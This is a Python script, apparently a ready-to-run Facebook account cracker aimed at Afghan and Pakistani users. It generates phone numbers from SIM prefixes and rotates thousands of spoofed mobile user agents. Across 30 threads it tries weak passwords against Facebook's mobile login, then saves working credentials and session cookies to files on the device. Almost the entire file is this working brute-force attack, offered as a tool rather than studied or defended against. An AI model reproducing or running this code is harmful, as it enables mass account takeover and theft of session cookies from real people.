#created by Mirwais Danishyar 
#!/usr/bin/python3
#---------------------[IMPORT]---------------------#
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform,string
import marshal
from string import *
import requests as ress
import zlib
import base64
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from time import sleep
from os import system
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup
from sys import exit as exit
cokbrut=[]
ses=requests.Session()
princp=[]
user=[]
loop = 0
cp = []
ok = []
twf = []
ugen = []

for t in range(10000):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','8.1.0'])
	b=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1','O11019','NMF26F'])
	c=random.randrange(111111,210000)
	d=random.randrange(73,100)
	e=random.randrange(4200,4900)
	f=random.randrange(40,150)
	random1=random.choice(['V1930A','vivo 1814','SM-J701MT','SM-A115U','SM-G610M','SM-J530F','SM-A307FN','SM-A405FN'])
	random2=random.choice(['XIAOMI POCO X2','M2102J20SG','XIAOMI Redmi Note 9 Pro','SM-A605G','SM-J610F','SM-N9750','SM-G935A'])
	brayen1=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{d}.0.{e}.{f} Mobile Safari/537.36'
	brayen2=f'Mozilla/5.0 (Linux; Android {a}; {random2} Build/{b}.{c}wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{d}.0.{e}.{f} Mobile Safari/537.36'
	brayen3=f'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) BC3 iOS/3.12.8 (build 541; iPhone XR; iOS 15.0.1'
	brayen4=f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'
	brayen5=f'Mozilla/6.0 (Filipina; (vx4;SMG-SAMSUNG) AppleWebKit/690.84 (KHTML,like Gecko) Filipina/156.0.9.0 safari/537.36'
	main_ua = random.choice([brayen1,brayen2,brayen3,brayen4,brayen5])
	ugen.append(main_ua)

for xd in range(5000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; Infinix '
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT','SMART'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
        
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; TECNO '
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
for xd in range(4000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; Smart HD Pro 2019 '
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    pall = ['[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FB_IAB/FB4A;FBAV/371.0.0.24.109;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/324.0.0.8.106;]', '[FB_IAB/FB4A;FBAV/388.0.0.32.105;]', '[FB_IAB/FB4A;FBAV/364.0.0.24.132;]', '[FB_IAB/FB4A;FBAV/386.0.0.35.108;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/318.0.0.16.105;]', '[FB_IAB/FB4A;FBAV/365.0.0.30.112;]', '[FB_IAB/FB4A;FBAV/362.0.0.27.109;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/Orca-Android;FBAV/376.1.0.25.106;]','[FB_IAB/FB4A;FBAV/397.0.0.23.404;]','[FB_IAB/FB4A;FBAV/396.1.0.28.104;]','[FB_IAB/FB4A;FBAV/309.0.0.47.119;]']
    m = random.choice(pall)
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l} {m}')
    ugen.append(uaku2)  
  
for xd in range(30000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; QMobile '
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT','POWER'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    pall = ['[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FB_IAB/FB4A;FBAV/371.0.0.24.109;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/324.0.0.8.106;]', '[FB_IAB/FB4A;FBAV/388.0.0.32.105;]', '[FB_IAB/FB4A;FBAV/364.0.0.24.132;]', '[FB_IAB/FB4A;FBAV/386.0.0.35.108;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/318.0.0.16.105;]', '[FB_IAB/FB4A;FBAV/365.0.0.30.112;]', '[FB_IAB/FB4A;FBAV/362.0.0.27.109;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/Orca-Android;FBAV/376.1.0.25.106;]']
    m = random.choice(pall)
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l} {m}')
    ugen.append(uaku2)    
    
for xd in range(1000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; QMobile '
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT','POWER'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
    aa='Mozilla/5.0 (Windows NT 10.0; Win64;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; Win64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)		        

A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
Y = '\033[1;33m' # PUTIH
Q = '\033[1;37m'
T = '\033[1;34m'
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
    
def passx():
    os.system("clear")
    print('\033[1;32m--------------------------------------------------------------') 
    print('            \x1b[97m\033[37;40m        [ ASIF SAKHANI  ]\033[0;m ')
    print('\033[1;32m--------------------------------------------------------------') 
    print("\033[1;97m[1] \033[1;93mAFGTAN  ")
    print("\033[1;97m[2] \033[1;93mPAKISTAN  ")
    print('\033[1;32m--------------------------------------------------------------') 
    mirwais = input("\033[1;37m[\033[1;32m!\033[1;37m]\033[1;37m SELECT METHOD \033[1;37m: \033[1;36m")
    if mirwais in ["1","1"]:
       afg()
    elif mirwais in ["2","2"]:
       pak()
    else:
        print('\033[1;31mINCORECT OPTION!\3[1;31m')
        passx()

def afg():
    print(f'\033[1;97m[!] \033[1;93mMTN SIM CODES  \033[1;91m             : \033[1;96m93777, 93766, 93767, 93776\033[1;37m')
    print(f'\033[1;97m[!] \033[1;93mAFG SIM CODES \033[1;91m              : \033[1;96m93799, 93729, 93728, 93796\033[1;37m')
    print(f'\033[1;97m[!] \033[1;93mAWCC + ETISALAT SIM CODES \033[1;91m  : \033[1;96m93701, 93786, 93788, 93784\033[1;37m')
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;93m SIM CODE \033[1;37m: \033[1;36m\033[1;37m')
    limit = int(input(f'\033[1;97m[!] \033[1;93mEXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;97m[+]\033[1;93m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;93m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;93m TOTAL IDZ\033[1;91m           : \033[1;96m["+tl+"] ")
        print(f'\033[1;97m[+]\033[1;93m ON/OFF YOUR MOBILE DATA BEFORE USE\033[1;37m')
        for love in user:
            uid = code+love
            pwx = [love,'123456','112233','kamu123','afghan12','1234567','12345678','123456789']
            manshera.submit(beta,uid,pwx,tl)
    print('')
    print('\033[1;97m[+]\033[1;93m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    input(f'\033[1;97m[+]\033[1;93m PRESS ENTER TO BACK MENU');os.system("clear");main()

def pak():
    print(f'\033[1;97m[!] \033[1;93mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305\033[1;37m')
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;93m SIM CODE \033[1;37m: \033[1;36m')
    limit = int(input(f'\033[1;97m[!] \033[1;93mEXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;97m[+]\033[1;93m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;93m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;93m TOTAL IDZ\033[1;91m           : \033[1;96m["+tl+"] ")
        print(f'\033[1;97m[+]\033[1;93m ON/OFF YOUR MOBILE DATA BEFORE USE\033[1;37m')
        for love in user:
            uid = code+love
            pwx = [love,'123456','1234567','12345678','123456789','pakistan12']
            manshera.submit(beta,uid,pwx,tl)
    print('')
    print('\033[1;97m[+]\033[1;93m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    input(f'\033[1;97m[+]\033[1;93m PRESS ENTER TO BACK MENU');os.system("clear");main()

def beta(uid,pwx,tl):
    global loop
    global ok
    global cp
    global ugen
    try:
        for ps in pwx:        	
            session = requests.Session()
            pro = random.choice(ugen)   
            free_fb = session.get('https://m.beta.facebook.com').text
            log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
            header_freefb = {'authority': 'x.facebook.com',
			'upgrade-insecure-requests': '1',
			'viewport-width': '980',
			'method': 'POST',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'dnt':'1', 
			'referer': 'https://mobile.facebook.com/',
			'x-requested-with':'mark.via.gp', 
			'sec-fetch-user': '?1',
		    'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'same-origin',
			'upgrade-insecure-requests': '1',
			'accept-encoding':'gzip, deflate, br','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '"Chromium";v="107", "Not)A;Brand";v="24"',
			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Windows"',
			'sec-ch-device-memory': '8',
			"sec-ch-prefers-color-scheme": '"light"',
            "user-agent": pro}
            lo = session.post('https://m.beta.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;96mASIF-OK\033[1;97m]\033[1;92m '+uid+' | '+ps+  ' \n \0333Cookie = \033[1;91m'+coki+ ' \n '+pro+' \033[0;97m')
                open('/sdcard/OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;90mASIF-CP\033[1;97m]\033[1;93m '+uid+' | '+ps+' ')
                    open('/sdcard/CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r [ASIF SAKHANI] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass 
#---------------------[END MENU]---------------------#
if __name__ == '__main__':
    passx()
